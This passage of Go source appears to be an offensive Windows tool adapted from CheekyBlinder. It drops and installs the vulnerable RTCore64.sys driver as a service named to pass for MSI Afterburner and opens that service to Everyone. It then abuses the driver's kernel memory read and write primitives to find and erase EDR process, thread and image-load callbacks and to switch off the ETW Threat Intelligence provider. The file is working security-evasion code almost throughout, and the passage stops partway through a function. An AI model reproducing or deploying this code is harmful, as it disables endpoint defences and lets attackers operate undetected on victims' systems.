package main

// https://github.com/br-sn/CheekyBlinder - multiple code snippets were re-used here
//go:generate go run $GOROOT/src/syscall/mksyscall_windows.go -output syscallwin.go main.go

import (
	"bufio"
	_ "embed"
	"encoding/csv"
	"fmt"
	"io"
	"math"
	"os"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

//go:embed resources/NtoskrnlOffsets.csv
var ntoskrnlOffsetsCSV string

//go:embed resources/RTCore64.sys
var binfile []byte

type (
	DWORD   uint32
	DWORD64 uint64
	LPVOID  uintptr
	LPDWORD *uint32
	LPCSTR  *int8
	LPCWSTR *int16
	HANDLE  uintptr
	BYTE    byte
)
type SECURITY_ATTRIBUTES struct {
	Length             uint32
	SecurityDescriptor unsafe.Pointer
	InheritHandle      uint32 // bool value
}

//sys EnumDeviceDrivers(lpImageBase uintptr, cb uint32, lpcbNeeded *uint32) (ret bool) = psapi.EnumDeviceDrivers
//sys GetDeviceDriverBaseNameW(lpImageBase uintptr,lpBaseName uintptr, nSize uint32) (ret uint32,err error) = psapi.GetDeviceDriverBaseNameW
//sys LoadLibraryW(lpLibFileName string) (handle uintptr, err error) = kernel32.LoadLibraryW
//sys GetProcAddress(hModule uintptr,lpProcName string) (address uintptr, err error) = kernel32.GetProcAddress
//sys FreeLibrary(hLibModule uintptr) (ret bool) = kernel32.FreeLibrary
//sys DeviceIoControl(hDevice uintptr, dwIoControlCode uint32, lpInBuffer uintptr, nInBufferSize uint32, lpOutBuffer uintptr, nOutBufferSize uint32,lpBytesReturned *uint32) (ret bool) = kernel32.DeviceIoControl
//sys CreateFile(lpFileName string, dwDesiredAccess uint32, dwShareMode uint32, lpSecurityAttributes *SECURITY_ATTRIBUTES, dwCreationDisposition uint32, dwFlagsAndAttributes uint32, hTemplateFile uintptr) (handle uintptr, err error) = kernel32.CreateFile
//sys CloseHandle(hObject HANDLE) (ret bool) = kernel32.CloseHandle
//sys GetLastError() (ret uint32 ) = kernel32.GetLastError
//sys RegGetValueW(hkey int,lpSubKey string, lpValue string, dwFlags uint32, pdwType *uint32, pvData uintptr, pcbData *uint32) (ret uint32, err error) = advapi32.RegGetValueW
//sys OpenSCManagerW(lpMachineName string, lpDatabaseName string, dwDesiredAccess uint32) (handle uintptr, err error) = advapi32.OpenSCManagerW
//sys OpenServiceW(hSCManager uintptr, lpServiceName string, dwDesiredAccess uint32) (handle uintptr, err error) = advapi32.OpenServiceW
//sys CreateServiceW(hSCManager uintptr, lpServiceName string, lpDisplayName string, dwDesiredAccess uint32, dwServiceType uint32, dwStartType uint32, dwErrorControl uint32, lpBinaryPathName string, lpLoadOrderGroup string, lpdwTagId string, lpDependencies string, lpServiceStartName string, lpPassword string) (handle uintptr, err error) = advapi32.CreateServiceW
//sys DeleteService(hService uintptr) (ret bool) = advapi32.DeleteService
//sys StartServiceW(hService uintptr, dwNumServiceArgs uint32, lpServiceArgVectors *int16) (ret bool) = advapi32.StartServiceW
//sys CloseServiceHandle(hSCObject uintptr) (ret bool) = advapi32.CloseServiceHandle

//sys QueryServiceObjectSecurity(hService uintptr, dwSecurityInformation uint32, lpSecurityDescriptor uintptr, cbBufSize uint32, pcbBytesNeeded *uint32) (ret bool) = advapi32.QueryServiceObjectSecurity
//sys BuildSecurityDescriptorW(pOwner unsafe.Pointer, pGroup unsafe.Pointer, cCountOfAccessEntries int64, pListOfAccessEntries *windows.EXPLICIT_ACCESS, cCountOfAuditEntries int64, pListOfAuditEntries *windows.EXPLICIT_ACCESS, pOldSD unsafe.Pointer, pSizeNewSD uint32, pNewSD *uintptr) (ret uint32) = advapi32.BuildSecurityDescriptorW
//sys SetServiceObjectSecurity(hService uintptr, dwSecurityInformation uint32, lpSecurityDescriptor uintptr) (ret bool) = advapi32.SetServiceObjectSecurity
//sys LocalFree(hMem uintptr) (ret bool) = advapi32.LocalFree
//sys SetEntriesInAclW(cCountOfExplicitEntries uint32, pListOfExplicitEntries *windows.EXPLICIT_ACCESS, OldAcl *windows.ACL, NewAcl **windows.ACL) (ret uint32) = advapi32.SetEntriesInAclW

// windows.ControlService()
// windows.CloseServiceHandle()
// windows.StartService()
// windows.CreateService()
// windows.GetLastError()
// windows.OpenSCManager()
// windows.LoadLibrary()

type NtoskrnlOffsets struct {
	ntoskrnlVersion                string
	pspCreateProcessNotifyRoutine  uint64
	pspCreateThreadNotifyRoutine   uint64
	pspLoadImageNotifyRoutine      uint64
	psProtection                   uint64
	etwThreatIntProvRegHandle      uint64
	etwRegEntryGuidEntry           uint64
	etwGuidEntryProviderEnableInfo uint64
}

type Offsets struct {
	UniqueProcessIdOffset    DWORD64
	ActiveProcessLinksOffset DWORD64
	TokenOffset              DWORD64
	SignatureLevelOffset     DWORD64
}

type Rtcore64MemoryRead struct {
	Pad0     [8]byte
	Address  DWORD64
	Pad1     [8]byte
	ReadSize DWORD
	Value    DWORD
	Pad3     [16]byte
}

const (
	RTCORE64_MEMORY_READ_CODE     uint32 = 0x80002048
	RTCORE64_MEMORY_WRITE_CODE    uint32 = 0x8000204c
	INVALID_HANDLE_VALUE          HANDLE = ^HANDLE(0)
	ERROR_SERVICE_DOES_NOT_EXIST  uint32 = 1060
	ERROR_SERVICE_ALREADY_RUNNING uint32 = 1056
	ERROR_INSUFFICIENT_BUFFER     uint32 = 122
	ERROR_SUCCESS                 uint32 = 0
	SERVICE_ALL_ACCESS                   = windows.SERVICE_QUERY_STATUS |
		windows.SERVICE_QUERY_CONFIG |
		windows.SERVICE_INTERROGATE |
		windows.SERVICE_ENUMERATE_DEPENDENTS |
		windows.SERVICE_PAUSE_CONTINUE |
		windows.SERVICE_START |
		windows.SERVICE_STOP |
		windows.SERVICE_USER_DEFINED_CONTROL |
		windows.READ_CONTROL
)

const (
	//NtoskrnlOffsetType
	CREATE_PROCESS_ROUTINE            = 0
	CREATE_THREAD_ROUTINE             = 1
	LOAD_IMAGE_ROUTINE                = 2
	PROTECTION_LEVEL                  = 3
	ETW_THREAT_INT_PROV_REG_HANDLE    = 4
	ETW_REG_ENTRY_GUIDENTRY           = 5
	ETW_GUID_ENTRY_PROVIDERENABLEINFO = 6
	_SUPPORTED_NTOSKRNL_OFFSETS_END   = 7
)

type SECURITY_DESCRIPTOR struct {
	Revision byte
	Sbz1     byte
	Control  uint16
	Owner    uintptr
	Group    uintptr
	Sacl     uintptr
	Dacl     uintptr
}

type KRNL_CALLBACK struct {
	driver         string
	callbackAddr   uint64
	callbackStruct uint64
	callbackFunc   uint64
	removed        bool
}

type FOUND_EDR_CALLBACKS struct {
	index         uint64
	EDR_CALLBACKS [256]KRNL_CALLBACK
}

//24byte
type SYSTEM_HANDLE_TABLE_ENTRY_INFO struct {
	UniqueProcessId       uint16
	CreatorBackTraceIndex uint16
	ObjectTypeIndex       uint8
	HandleAttributes      uint8
	HandleValue           uint16
	Object                uintptr
	GrantedAccess         uint32
}

type SYSTEM_HANDLE_INFORMATION struct {
	NumberOfHandles uint32                           //4
	Handles         []SYSTEM_HANDLE_TABLE_ENTRY_INFO //any size
}

func getDriverHandle() HANDLE {
	name, err := syscall.UTF16PtrFromString("\\\\.\\RTCore64")
	if err != nil {
		panic(err)
	}
	device, err := windows.CreateFile(name, windows.GENERIC_READ|windows.GENERIC_WRITE, 0, nil, windows.OPEN_EXISTING, 0, 0)
	if err != nil {
		fmt.Println("[!] Unable to obtain a handle to the device object")
		return HANDLE(device)
	} else {
		fmt.Printf("[+] Device object handle obtained: %x\n", device)
		return HANDLE(device)
	}
}

func writeMemoryPrimitive(device HANDLE, s DWORD, adr DWORD64, val DWORD) {
	memRead := Rtcore64MemoryRead{}
	memRead.Address = adr
	memRead.ReadSize = s
	memRead.Value = val
	var bytesReturned uint32
	memSize := uint32(unsafe.Sizeof(memRead))
	DeviceIoControl(uintptr(device), RTCORE64_MEMORY_WRITE_CODE, uintptr(unsafe.Pointer(&memRead)), memSize, uintptr(unsafe.Pointer(&memRead)), memSize, &bytesReturned)
}

func writeMemoryBYTE(device HANDLE, adr DWORD64, val DWORD64) {
	currentValue := readMemoryDWORD64(device, adr)
	val = (currentValue & 0xFFFFFFFFFFFFFFF0) | val
	writeMemoryPrimitive(device, 4, adr, DWORD(val&0xffffffff))
	writeMemoryPrimitive(device, 4, adr+4, DWORD(val>>32))
}

func writeMemoryWORD(device HANDLE, adr DWORD64, val DWORD64) {
	currentValue := readMemoryDWORD64(device, adr)
	val = (currentValue & 0xFFFFFFFFFFFFFF00) | val
	writeMemoryPrimitive(device, 4, adr, DWORD(val&0xffffffff))
	writeMemoryPrimitive(device, 4, adr+4, DWORD(val>>32))
}

func writeMemoryDWORD64(device HANDLE, adr DWORD64, val DWORD64) {
	writeMemoryPrimitive(device, 4, adr, DWORD(val&0xffffffff))
	writeMemoryPrimitive(device, 4, adr+4, DWORD(val>>32))
}

func readMemoryPrimitive(device HANDLE, s DWORD, adr DWORD64) DWORD {
	memRead := Rtcore64MemoryRead{}
	memRead.Address = adr
	memRead.ReadSize = s
	var bytesReturned uint32
	memSize := uint32(unsafe.Sizeof(memRead))
	DeviceIoControl(uintptr(device), RTCORE64_MEMORY_READ_CODE, uintptr(unsafe.Pointer(&memRead)), memSize, uintptr(unsafe.Pointer(&memRead)), memSize, &bytesReturned)
	return memRead.Value
}

func readMemoryBYTE(device HANDLE, adr DWORD64) DWORD64 {
	return DWORD64(readMemoryPrimitive(device, 1, adr)) & 0xff
}

func readMemoryDWORD(device HANDLE, adr DWORD64) DWORD64 {
	return DWORD64(readMemoryPrimitive(device, 4, adr)) & 0xffffffff
}

func readMemoryDWORD64(device HANDLE, adr DWORD64) DWORD64 {
	return (readMemoryDWORD(device, adr+4) << 32) | readMemoryDWORD(device, adr)
}

func serviceAddEveryoneAccess(srvName string) error {
	trustee := windows.TRUSTEE{}
	trustee.MultipleTrustee = nil
	trustee.MultipleTrusteeOperation = windows.NO_MULTIPLE_TRUSTEE
	trustee.TrusteeForm = windows.TRUSTEE_IS_SID
	trustee.TrusteeType = windows.TRUSTEE_IS_WELL_KNOWN_GROUP
	trustee.TrusteeValue = 0

	forEveryoneACL := windows.EXPLICIT_ACCESS{}
	forEveryoneACL.AccessPermissions = SERVICE_ALL_ACCESS
	forEveryoneACL.AccessMode = windows.SET_ACCESS
	forEveryoneACL.Inheritance = windows.NO_INHERITANCE
	forEveryoneACL.Trustee = trustee

	oldSd, err := windows.GetNamedSecurityInfo(srvName, windows.SE_SERVICE, windows.DACL_SECURITY_INFORMATION)
	if err != nil {
		return err
	}
	stringSID, err := syscall.UTF16PtrFromString("S-1-1-0")
	if err != nil {
		return err
	}
	var sid *windows.SID
	err = windows.ConvertStringSidToSid(stringSID, &sid)
	if err != nil {
		return err
	}
	oldDACL, _, _ := oldSd.DACL()
	forEveryoneACL.Trustee.TrusteeValue = windows.TrusteeValueFromSID(sid)
	var newDACL *windows.ACL
	SetEntriesInAclW(1, &forEveryoneACL, oldDACL, &newDACL)
	err = windows.SetNamedSecurityInfo(srvName, windows.SE_SERVICE, windows.DACL_SECURITY_INFORMATION, nil, nil, newDACL, nil)
	if err != nil {
		return err
	}
	windows.FreeSid(sid)
	return nil
}

func serviceInstall(srvName string, dName string, bPath string, srvType uint32, startType uint32, startIt bool) uint32 {
	var hS windows.Handle
	//var hSc uintptr = 0
	databaseName, err := syscall.UTF16PtrFromString("ServicesActive")
	if err != nil {
		panic(err)
	}
	hSc, err := windows.OpenSCManager(nil, databaseName, windows.SC_MANAGER_CONNECT|windows.SC_MANAGER_CREATE_SERVICE)
	if err != nil {
		fmt.Println("OpenSCManager(create)")
		return uint32(err.(syscall.Errno))
	}
	serviceName, err := syscall.UTF16PtrFromString(srvName)
	if err != nil {
		panic(err)
	}
	displayName, err := syscall.UTF16PtrFromString(dName)
	if err != nil {
		panic(err)
	}
	binPath, err := syscall.UTF16PtrFromString(bPath)
	if err != nil {
		panic(err)
	}
	hS, err = windows.OpenService(hSc, serviceName, uint32(windows.SERVICE_START))
	if err == nil {
		fmt.Printf("[+] '%s' service already registered\n", srvName)
	} else {
		if uint32(err.(syscall.Errno)) == ERROR_SERVICE_DOES_NOT_EXIST {
			fmt.Printf("[*] '%s' service not present\n", srvName)
			hS, err = windows.CreateService(hSc, serviceName, displayName, windows.READ_CONTROL|windows.WRITE_DAC|windows.SERVICE_START, srvType,
				startType, windows.SERVICE_ERROR_NORMAL, binPath, nil, nil, nil, nil, nil)
			if err == nil {
				fmt.Printf("[+] '%s' service successfully registered\n", srvName)
				err = serviceAddEveryoneAccess(srvName)
				if err == nil {
					fmt.Printf("[+] '%s' service ACL to everyone\n", srvName)
				} else {
					fmt.Printf("[!] '%s' ServiceAddEveryoneAccess\n", srvName)
					panic(err)
				}
			} else {
				fmt.Println("[X] CreateService")
			}
		} else {
			fmt.Println("OpenService")
		}
	}

	if uintptr(hS) != 0 {
		if startIt {
			err = windows.StartService(hS, 0, nil)
			if err == nil {
				fmt.Printf("[+] '%s' service started\n", srvName)
			} else if uint32(err.(syscall.Errno)) == ERROR_SERVICE_ALREADY_RUNNING {
				fmt.Printf("[*] '%s' service already started\n", srvName)
			} else {
				fmt.Println("StartService")
				return uint32(err.(syscall.Errno))
			}
		}
		windows.CloseServiceHandle(windows.Handle(hSc))
	}
	windows.CloseServiceHandle(windows.Handle(hSc))

	return 0
}

func serviceGenericControl(srvName string, dwDesiredAccess uint32, dwControl uint32, ptrServiceStatus *windows.SERVICE_STATUS) (bool, error) {
	status := false
	var srvStatus windows.SERVICE_STATUS
	var hS windows.Handle
	databaseName, err := syscall.UTF16PtrFromString("ServicesActive")
	if err != nil {
		return status, err
	}
	hSc, err := windows.OpenSCManager(nil, databaseName, windows.SC_MANAGER_CONNECT)
	if err != nil {
		return status, err
	}
	if uintptr(hSc) != 0 {
		serviceName, err := syscall.UTF16PtrFromString(srvName)
		if err != nil {
			return status, err
		}
		hS, err = windows.OpenService(hSc, serviceName, dwDesiredAccess)
		if err != nil {
			return status, err
		}
		if uintptr(hS) != 0 {
			err = windows.ControlService(hS, dwControl, &srvStatus)
			if err != nil {
				return status, err
			}
			windows.CloseServiceHandle(hS)
			status = true
		}
		windows.CloseServiceHandle(hSc)
	}
	return status, nil
}

func serviceUninstall(srvName string, cnt int) bool {
	deleted := false
	var hSC windows.Handle
	var hS windows.Handle
	var srvStatus windows.SERVICE_STATUS
	if cnt > 3 {
		fmt.Printf("[!] Reached maximun number of attempts (3) to uninstall the service '%s'\n", srvName)
		return false
	}
	status, err := serviceGenericControl(srvName, windows.SERVICE_STOP, windows.SERVICE_CONTROL_STOP, nil)

	if status {
		fmt.Printf("[+] '%s' service stopped\n", srvName)
	} else if err.(syscall.Errno) == windows.ERROR_SERVICE_DOES_NOT_EXIST {
		fmt.Printf("[+] '%s' service does not exeist\n", srvName)
		return true
	} else if err.(syscall.Errno) == windows.ERROR_SERVICE_NOT_ACTIVE {
		fmt.Printf("[+] '%s' service not running\n", srvName)
	} else if err.(syscall.Errno) == windows.ERROR_SERVICE_CANNOT_ACCEPT_CTRL {
		fmt.Printf("[*] '%s' service cannot accept control messages at this time, waiting...\n", srvName)
		time.Sleep(1000)
	} else {
		fmt.Println("ServiceUninstall")
		time.Sleep(1000)
		return serviceUninstall(srvName, cnt+1)
	}

	databaseName, err := syscall.UTF16PtrFromString("ServicesActive")
	if err != nil {
		panic(err)
	}
	hSC, err = windows.OpenSCManager(nil, databaseName, windows.SC_MANAGER_CONNECT)
	if err != nil {
		panic(err)
	}
	if uintptr(hSC) != 0 {
		serviceName, err := syscall.UTF16PtrFromString(srvName)
		if err != nil {
			panic(err)
		}
		hS, err = windows.OpenService(hSC, serviceName, windows.SERVICE_QUERY_STATUS|windows.DELETE)
		if err != nil {
			windows.CloseServiceHandle(hSC)
			panic(err)
		}
		if uintptr(hS) != 0 {
			err = windows.QueryServiceStatus(hS, &srvStatus)
			if err != nil {
				println(uint32(err.(syscall.Errno)))
				windows.CloseServiceHandle(hSC)
				panic(err)
			}
			if !(srvStatus.CurrentState == windows.SERVICE_STOPPED) {
				windows.CloseServiceHandle(hS)
				windows.CloseServiceHandle(hSC)
				time.Sleep(1000)
				return serviceUninstall(srvName, cnt+1)
			} else {
				err = windows.DeleteService(hS)
				if err != nil {
					panic(err)
				}
				deleted = true
				windows.CloseServiceHandle(hSC)
			}
		}
		windows.CloseServiceHandle(hSC)
	}
	if !deleted {
		time.Sleep(1000)
		return serviceUninstall(srvName, cnt+1)
	}
	return deleted
}

func installVulnDriver() {
	currentDir, _ := os.Getwd()
	binPath := currentDir + "/RTCore64.sys"
	os.WriteFile(binPath, binfile, 0777)
	status := serviceInstall("RTCore64", "Micro-Star MSI Afterburner", binPath, windows.SERVICE_KERNEL_DRIVER, windows.SERVICE_AUTO_START, true)
	if status == 0x05 {
		fmt.Println("[!] 0x00000005 - Access Denied when attempting to install the driver - Did you run as administrator?")
	}
}

func uninstallVulnDriver() {
	status := serviceUninstall("RTCore64", 0)
	if !status {
		fmt.Println("ServiceUninstall")
	}

}

func getFileVersion(fName string) (string, error) {
	var zeroHandle windows.Handle
	var lpBuffer uintptr
	var size uint32
	zeroHandle = 0
	verSize, err := windows.GetFileVersionInfoSize(fName, &zeroHandle)
	if err != nil {
		return "", err
	}
	if verSize != 0 {
		data := make([]byte, verSize)
		err = windows.GetFileVersionInfo(fName, 0, verSize, unsafe.Pointer(&data[0]))
		if err != nil {
			return "", err
		}
		err = windows.VerQueryValue(unsafe.Pointer(&data[0]), "\\", unsafe.Pointer(&lpBuffer), &size)
		if err != nil {
			return "", err
		}
		if size != 0 {
			start := int(lpBuffer) - int(uintptr(unsafe.Pointer(&data[0])))
			end := start + int(size)
			if start < 0 || start >= len(data) || end < start || end > len(data) {
				fmt.Println("VerQueryValueRoot")
			}
			infoData := data[start:end]
			info := *((*windows.VS_FIXEDFILEINFO)(unsafe.Pointer(&infoData[0])))
			majorVersion := (info.FileVersionLS >> 16) & 0xffff
			minorVersion := (info.FileVersionLS >> 0) & 0xffff
			return fmt.Sprintf("%d-%d", majorVersion, minorVersion), nil
		}
	}
	return "", nil
}

func getNtoskrnlVersion() NtoskrnlOffsets {
	dir, err := windows.GetSystemDirectory()
	ntoskrnPath := dir + "\\ntoskrnl.exe"
	if err != nil {
		panic(err)
	}
	fmt.Println(ntoskrnPath)
	version, err := getFileVersion(ntoskrnPath)
	if err != nil {
		panic(err)
	}

	ntoskrnVersion := fmt.Sprintf("ntoskrnl_%s.exe", version)

	ntoskrnlOffsets := NtoskrnlOffsets{}
	r := csv.NewReader(strings.NewReader(ntoskrnlOffsetsCSV))
	for {
		row, err := r.Read()
		if err == io.EOF {
			ntoskrnlOffsets = NtoskrnlOffsets{"", 0, 0, 0, 0, 0, 0, 0}
			break
		}
		if row[0] == ntoskrnVersion {
			ntoskrnlVersion := row[0]
			pspCreateProcessNotifyRoutine, _ := strconv.ParseUint(row[1], 16, 64)
			pspCreateThreadNotifyRoutine, _ := strconv.ParseUint(row[2], 16, 64)
			pspLoadImageNotifyRoutine, _ := strconv.ParseUint(row[3], 16, 64)
			psProtection, _ := strconv.ParseUint(row[4], 16, 64)
			etwThreatIntProvRegHandle, _ := strconv.ParseUint(row[5], 16, 64)
			etwRegEntryGuidEntry, _ := strconv.ParseUint(row[6], 16, 64)
			etwGuidEntryProviderEnableInfo, _ := strconv.ParseUint(row[7], 16, 64)
			ntoskrnlOffsets = NtoskrnlOffsets{
				ntoskrnlVersion,
				pspCreateProcessNotifyRoutine,
				pspCreateThreadNotifyRoutine,
				pspLoadImageNotifyRoutine,
				psProtection,
				etwThreatIntProvRegHandle,
				etwRegEntryGuidEntry,
				etwGuidEntryProviderEnableInfo,
			}
			break
		}
	}
	return ntoskrnlOffsets
}

func findNtoskrnlBaseAddress() DWORD64 {
	cbNeeded := uint32(0)
	var drivers [1024]DWORD64
	sizeOfdrivers := uint32(unsafe.Sizeof(drivers))
	if EnumDeviceDrivers(uintptr(unsafe.Pointer(&drivers)), sizeOfdrivers, &cbNeeded) {
		return drivers[0]
	}
	//need error response
	return drivers[0]
}

func findDriver(adr DWORD64) (string, error) {
	cbNeeded := uint32(0)
	var drivers [1024]DWORD64
	var diff DWORD64
	minDiff := DWORD64(math.MaxUint64)
	sizeOfdrivers := uint32(unsafe.Sizeof(drivers))
	if EnumDeviceDrivers(uintptr(unsafe.Pointer(&drivers)), sizeOfdrivers, &cbNeeded) {
		cDrivers := int(cbNeeded / 8) //8 means sizeof(drivers[0])
		for i := 0; i < cDrivers; i++ {
			if drivers[i] <= adr {
				diff = adr - drivers[i]
				if diff < minDiff {
					minDiff = diff
				}
			}
		}
	} else {
		fmt.Printf("[!] Could not resolve driver for %x, an EDR driver might be missed\n", adr)
		return "", nil
	}
	var szDriver [1024]uint16
	_, err := GetDeviceDriverBaseNameW(uintptr(adr-minDiff), uintptr(unsafe.Pointer(&szDriver)), 1024)
	if err != nil {
		return "", err
	}
	driver := syscall.UTF16ToString(szDriver[:])
	fmt.Printf("[+] %x [%s + %x]\n", adr, driver, minDiff)
	return driver, nil
}

func operateNotifyRoutines(notifyRoutineAddress DWORD64, edrDrivers *FOUND_EDR_CALLBACKS, remove bool) {
	device := getDriverHandle()
	currentEDRDriversCount := 0
	maxCallbacks := 64
	for i := 0; i < maxCallbacks; i++ {
		callbackStruct := readMemoryDWORD64(device, notifyRoutineAddress+DWORD64(i*8)) //8 means sizeof(DWORD64)
		if callbackStruct != 0 {
			callback := (callbackStruct &^ 0b1111) + 8
			cbFunction := readMemoryDWORD64(device, callback)
			driver, err := findDriver(cbFunction)
			if err != nil {
				panic(err)
			}
			if driver != "" && isDriverEDR(driver) {
				callbackAddr := notifyRoutineAddress + DWORD64(i*8) //8 means sizeof(DWORD64)
				newFoundDriver := KRNL_CALLBACK{}
				newFoundDriver.callbackAddr = uint64(callbackAddr)
				newFoundDriver.callbackStruct = uint64(callbackStruct)
				newFoundDriver.callbackFunc = uint64(cbFunction)

				if !remove {
					fmt.Printf("[+] Found EDR driver callback: '%s' [callback addr: %x | callback struct: %x | callback function: %x]\n", driver, callbackAddr, callbackStruct, cbFunction)
					newFoundDriver.removed = false
				} else {
					fmt.Printf("[+] Removing EDR driver callback: '%s' [callback addr: %x | callback struct: %x | callback function: %x]\n", driver, callbackAddr, callbackStruct, cbFunction)
					writeMemoryDWORD64(device, callbackAddr, 0x0000000000000000)
					newFoundDriver.removed = true
				}
				edrDrivers.EDR_CALLBACKS[int(edrDrivers.index)+currentEDRDriversCount] = newFoundDriver
				currentEDRDriversCount++
			}
		}

	}
	edrDrivers.index = edrDrivers.index + uint64(currentEDRDriversCount)
	if currentEDRDriversCount == 0 {
		fmt.Println("[+] No EDR driver(s) found!")
	} else if remove {
		fmt.Printf("[+] Removed a total of %d EDR / security products driver(s)\n", currentEDRDriversCount)
	} else {
		fmt.Printf("[+] Found a total of %d EDR / security products driver(s)\n", currentEDRDriversCount)
	}
	CloseHandle(device)
}

func (nOffsets *NtoskrnlOffsets) toNtoskrnlOffsets(nrt int) DWORD64 {
	switch nrt {
	case CREATE_PROCESS_ROUTINE:
		return DWORD64(nOffsets.pspCreateProcessNotifyRoutine)
	case CREATE_THREAD_ROUTINE:
		return DWORD64(nOffsets.pspCreateThreadNotifyRoutine)
	case LOAD_IMAGE_ROUTINE:
		return DWORD64(nOffsets.pspLoadImageNotifyRoutine)
	case PROTECTION_LEVEL:
		return DWORD64(nOffsets.psProtection)
	case ETW_THREAT_INT_PROV_REG_HANDLE:
		return DWORD64(nOffsets.etwThreatIntProvRegHandle)
	case ETW_REG_ENTRY_GUIDENTRY:
		return DWORD64(nOffsets.etwRegEntryGuidEntry)
	case ETW_GUID_ENTRY_PROVIDERENABLEINFO:
		return DWORD64(nOffsets.etwGuidEntryProviderEnableInfo)
	}
	return 0
}
func getPspXNotifyRoutineAddress(nrt int, nOffsets *NtoskrnlOffsets) DWORD64 {
	ntoskrnlBaseAddress := findNtoskrnlBaseAddress()
	pspXNotifyRoutineOffset := nOffsets.toNtoskrnlOffsets(nrt)
	pspXNotifyRoutineAddress := ntoskrnlBaseAddress + pspXNotifyRoutineOffset
	return pspXNotifyRoutineAddress
}

func enumPspXNotifyRoutine(nrt int, edrDrivers *FOUND_EDR_CALLBACKS, nOffsets *NtoskrnlOffsets) {
	notifyRoutineTypeStrs := [3]string{"process creation", "thread creation", "image loading"}
	notifyRoutineTypeNames := [3]string{"ProcessCreate", "ThreadCreate", "LoadImage"}
	pspXNotifyRoutineAddress := getPspXNotifyRoutineAddress(nrt, nOffsets)
	fmt.Printf("[+] Enumerating %s callbacks\n", notifyRoutineTypeStrs[nrt])
	fmt.Printf("[+] Psp%sNotifyRoutine: %x\n", notifyRoutineTypeNames[nrt], pspXNotifyRoutineAddress)
	operateNotifyRoutines(pspXNotifyRoutineAddress, edrDrivers, false)
}

func removePspXNotifyRoutine(nrt int, edrDrivers *FOUND_EDR_CALLBACKS, nOffsets *NtoskrnlOffsets) {
	notifyRoutineTypeStrs := [3]string{"process creation", "thread creation", "image loading"}
	notifyRoutineTypeNames := [3]string{"ProcessCreate", "ThreadCreate", "LoadImage"}
	pspXNotifyRoutineAddress := getPspXNotifyRoutineAddress(nrt, nOffsets)
	fmt.Printf("[+] Removing %s callbacks\n", notifyRoutineTypeStrs[nrt])
	fmt.Printf("[+] Psp%sNotifyRoutine: %x\n", notifyRoutineTypeNames[nrt], pspXNotifyRoutineAddress)
	operateNotifyRoutines(pspXNotifyRoutineAddress, edrDrivers, true)
}

func enumAllEDRKernelCallbacks() {
	ntoskrnlOffsets := getNtoskrnlVersion()
	ntoskrnlVersion := ntoskrnlOffsets.ntoskrnlVersion
	if ntoskrnlVersion == "" {
		fmt.Printf("NtoskrnlVersion not found -> %s\n", ntoskrnlOffsets.ntoskrnlVersion)
		return
	}
	fmt.Printf("NtoskrnlVersion is %s\n", ntoskrnlOffsets.ntoskrnlVersion)
	var edrDrivers FOUND_EDR_CALLBACKS
	edrDrivers.index = 0
	enumPspXNotifyRoutine(CREATE_PROCESS_ROUTINE, &edrDrivers, &ntoskrnlOffsets)
	enumPspXNotifyRoutine(CREATE_THREAD_ROUTINE, &edrDrivers, &ntoskrnlOffsets)
	enumPspXNotifyRoutine(LOAD_IMAGE_ROUTINE, &edrDrivers, &ntoskrnlOffsets)
	println(edrDrivers.index)
}

func removeAllEDRKernelCallbacks() {
	ntoskrnlOffsets := getNtoskrnlVersion()
	ntoskrnlVersion := ntoskrnlOffsets.ntoskrnlVersion
	if ntoskrnlVersion == "" {
		fmt.Printf("NtoskrnlVersion not found -> %s\n", ntoskrnlOffsets.ntoskrnlVersion)
		return
	}
	fmt.Printf("NtoskrnlVersion is %s\n", ntoskrnlOffsets.ntoskrnlVersion)
	var edrDrivers FOUND_EDR_CALLBACKS
	edrDrivers.index = 0
	removePspXNotifyRoutine(CREATE_PROCESS_ROUTINE, &edrDrivers, &ntoskrnlOffsets)
	removePspXNotifyRoutine(CREATE_THREAD_ROUTINE, &edrDrivers, &ntoskrnlOffsets)
	removePspXNotifyRoutine(LOAD_IMAGE_ROUTINE, &edrDrivers, &ntoskrnlOffsets)
	println(edrDrivers.index)
}

func getEtwThreatIntProvRegHandleAddress(nOffsets *NtoskrnlOffsets) DWORD64 {
	if nOffsets.etwThreatIntProvRegHandle == 0 {
		return 0
	}
	ntoskrnlBaseAddress := findNtoskrnlBaseAddress()
	return ntoskrnlBaseAddress + DWORD64(nOffsets.etwThreatIntProvRegHandle)

}

func getEtwThreatIntProviderEnableInfoAddress(nOffsets *NtoskrnlOffsets) DWORD64 {
	if nOffsets.etwThreatIntProvRegHandle == 0 && nOffsets.etwRegEntryGuidEntry == 0 && nOffsets.etwGuidEntryProviderEnableInfo == 0 {
		fmt.Println("[!] ETW Threat Intel ProviderEnableInfo address could not be found. This version of ntoskrnl may not implement ETW Threat Intel.")
		return 0
	}
	device := getDriverHandle()
	etwThreatIntProvRegHandleAddress := getEtwThreatIntProvRegHandleAddress(nOffsets)
	etwThreatIntETWREGENTRYAddress := readMemoryDWORD64(device, etwThreatIntProvRegHandleAddress)
	fmt.Printf("[+] Found ETW Threat Intel provider _ETW_REG_ENTRY at %x\n", etwThreatIntETWREGENTRYAddress)
	etwThreatIntETWGUIDENTRYAddress := readMemoryDWORD64(device, etwThreatIntETWREGENTRYAddress+DWORD64(nOffsets.etwRegEntryGuidEntry))
	CloseHandle(device)
	return etwThreatIntETWGUIDENTRYAddress + DWORD64(nOffsets.etwGuidEntryProviderEnableInfo)

}

func changeStatusETWThreatIntelProvider(nOffsets *NtoskrnlOffsets, enable bool) {
	var provState DWORD64 = 0
	var txtState string = "disable"
	if enable {
		provState = 1
		txtState = "enable"
	}
	etwThreatIntProviderEnableInfoAddress := getEtwThreatIntProviderEnableInfoAddress(nOffsets)
	if etwThreatIntProviderEnableInfoAddress == 0 {
		return
	}
	fmt.Printf("[*] Attempting to %sd the ETW Threat Intel provider by patching ProviderEnableInfo at %x with 0x%d.\n", txtState, etwThreatIntProviderEnableInfoAddress, provState)

	device := getDriverHandle()
	writeMemoryBYTE(device, etwThreatIntProviderEnableInfoAddress, provState)
	finalState := isETWThreatIntelProviderEnabled()
	if finalState == enable {
		fmt.Printf("[+] The ETW Threat Intel provider was successfully %sd!\n", txtState)
	} else {
		fmt.Printf("[!] Failed to %s the ETW Threat Intel provider!\n", txtState)
	}
}

func isETWThreatIntelProviderEnabled() bool {
	state := false

	ntoskrnlOffsets := getNtoskrnlVersion()
	ntoskrnlVersion := ntoskrnlOffsets.ntoskrnlVersion
	if ntoskrnlVersion == "" {
		fmt.Printf("NtoskrnlVersion not found -> %s\n", ntoskrnlOffsets.ntoskrnlVersion)
		return state
	}
